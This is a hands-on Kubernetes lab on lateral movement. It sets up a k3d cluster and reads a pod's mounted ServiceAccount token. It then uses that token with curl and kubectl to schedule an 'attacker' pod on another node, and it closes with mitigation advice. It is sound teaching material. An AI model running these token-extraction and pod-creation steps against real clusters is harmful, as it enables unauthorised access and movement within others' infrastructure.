# Lab 2 – Lateral Movement Between Worker Nodes

## Goal
Demonstrate how an attacker who compromises one pod can use its ServiceAccount token to schedule a pod on a different worker node.

---

## Lab Setup

We’ll create:
1. **Two worker nodes** in your k3d cluster (`k3d-lab2-agent-0` and `k3d-lab2-agent-1`).
2. A **namespace** (`lab2`).
3. A **vulnerable pod** on **Node 1** with:
   - Default ServiceAccount
   - Automounted token
   - No RBAC restrictions (can `create pods`)
4. The attacker will:
   - Extract the ServiceAccount token.
   - Use it to schedule a malicious pod (`attacker`) on **Node 2**.

---

## Step-by-Step Instructions

### 1. Create Namespace & Role
```bash
k3d cluster create lab2 \
  --agents 2 \
  --k3s-arg "--disable=traefik@server:0" \
  --k3s-arg "--tls-san=127.0.0.1@server:0" \
  --wait

kubectl get nodes -o wide

kubectl create namespace lab2
kubectl -n lab2 create role pod-creator --verb=create --resource=pods
kubectl -n lab2 create rolebinding pod-creator-bind   --role=pod-creator   --serviceaccount=lab2:default
```

### 2. Deploy Compromised Pod on Node 1
```yaml
# compromised-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: compromised
  namespace: lab2
spec:
  nodeName: k3d-lab2-agent-0
  containers:
  - name: shell
    image: alpine
    command: ["sleep", "infinity"]
```
```bash
kubectl apply -f compromised-pod.yaml
```

### 3. Inside the Compromised Pod: Extract Token
```bash
kubectl -n lab2 exec -it compromised -- sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $TOKEN

CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

### 4. Use Token to Deploy Pod on Node 2
Create the manifest with `nodeName` set to **Node 2**:
```bash
cat <<EOF > attacker.yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  namespace: lab2
spec:
  nodeName: k3d-lab2-agent-1
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "infinity"]
EOF
```

Then from inside the compromised pod:
```bash
curl --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST \
  --data-binary @attacker.yaml \
  https://k3d-lab2-server-0:6443/api/v1/namespaces/lab2/pods


kubectl --server=https://k3d-lab2-server-0:6443   --token="$TOKEN"   apply -f attacker.yaml
```

---

## Expected Outcome
- The `attacker` pod appears **running on Node 2** even though the attacker never had direct access to that node.
- This demonstrates how **cluster-wide RBAC** plus default ServiceAccount tokens enable cross-node movement.

Exit the pod and confirm:
```bash
kubectl -n lab2 get pods -o wide
```

---

## Mitigation Tie-In
- Set `automountServiceAccountToken: false` in pod specs where tokens are not needed.
- Scope RBAC to **least privilege**.
- Avoid giving ServiceAccounts the ability to create pods unless absolutely necessary.

Exit the pod and confirm:
```bash
k3d cluster delete lab2
```